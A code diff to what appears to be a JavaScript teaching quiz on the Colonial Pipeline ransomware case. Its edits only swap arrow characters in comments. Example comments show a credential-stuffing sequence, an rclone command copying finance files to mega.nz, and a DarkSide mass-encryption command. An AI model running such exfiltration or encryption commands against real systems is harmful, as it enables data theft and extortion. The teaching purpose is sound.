@@ -115,7 +115,7 @@ const tsaPipelineMandate = {
     hint: "Tight coupling where IT system failures force the shutdown of healthy physical SCADA systems.",
     level: "Expert",
     codeExample: `// IT/OT Interdependency Decoupling Architecture:
-// INSECURE (Colonial 2021): SCADA Pumps cannot run if ERP Billing is offline -> GRID STOPS!
+// INSECURE (Colonial 2021): SCADA Pumps cannot run if ERP Billing is offline → GRID STOPS!
 // RESILIENT (Modern): SCADA maintains autonomous local storage buffers to pump fuel safely for 14 days without corporate IT billing connectivity.`
   },
   {
@@ -149,7 +149,7 @@ void EncryptFileHybrid(const char* filePath, RSA* masterPublicKey) {
 // 1. Attacker queries dark web database: "email: employee@colonialpipeline.com"
 // 2. Discovers leaked hash from 2018 LinkedIn breach: "Summer2018!"
 // 3. Tests "employee@colonialpipeline.com : Summer2018!" against https://vpn.colonialpipeline.com
-// 4. Single-factor VPN accepts password -> Attacker gains internal LAN shell!`
+// 4. Single-factor VPN accepts password → Attacker gains internal LAN shell!`
   },
   {
     id: 11,
@@ -188,9 +188,9 @@ const otAutonomousMode = {
     hint: "Stealing sensitive corporate data to threaten public leaks even if backups exist.",
     level: "Moderate",
     codeExample: `// Double Extortion Pipeline:
-// Phase 1: Recon & Exfiltration -> rclone.exe copy C:\\Finance mega.nz:/Colonial_Dump/
-// Phase 2: Mass Encryption -> darkside.exe -path C:\\ -threads 32
-// Phase 3: Extortion Notice -> "Pay 75 BTC for decryptor AND non-disclosure agreement"`
+// Phase 1: Recon & Exfiltration → rclone.exe copy C:\\Finance mega.nz:/Colonial_Dump/
+// Phase 2: Mass Encryption → darkside.exe -path C:\\ -threads 32
+// Phase 3: Extortion Notice → "Pay 75 BTC for decryptor AND non-disclosure agreement"`
   },
   {
     id: 14,
@@ -249,7 +249,7 @@ const fido2Auth = {
   credentialCheck: "Password accepted",
   hardwareChallenge: "FIDO2 WebAuthn cryptographic assertion",
   userPresence: "Physical capacitive touch on YubiKey hardware sensor REQUIRED",
-  result: "Attacker on dark web CANNOT satisfy physical hardware assertion -> ACCESS DENIED"
+  result: "Attacker on dark web CANNOT satisfy physical hardware assertion → ACCESS DENIED"
 };`
   },
   {
@@ -336,7 +336,7 @@ detection:
     codeExample: `// Critical Incident Escalation Timeline:
 // Hour 0: Ransomware detected on IT network
 // Hour 1: Management proactively isolates physical pipeline
-// Hour 6: FBI Ransomware Task Force engaged -> Tracing wallet begins
+// Hour 6: FBI Ransomware Task Force engaged → Tracing wallet begins
 // Hour 12: Mandatory CISA / TSA regulatory incident report filed`
   },
   {
@@ -349,7 +349,7 @@ detection:
     codeExample: `// Blockchain Transaction Hop Trace:
 // Colonial Payment (75 BTC) ---> Transaction TX_849A...
 // Split 1: 11.25 BTC to DarkSide Core Developer Wallet
-// Split 2: 63.75 BTC to Affiliate Wallet (Address: 1Mt8nv...) -> FBI Seizure Executed!`
+// Split 2: 63.75 BTC to Affiliate Wallet (Address: 1Mt8nv...) → FBI Seizure Executed!`
   },
   {
     id: 25,
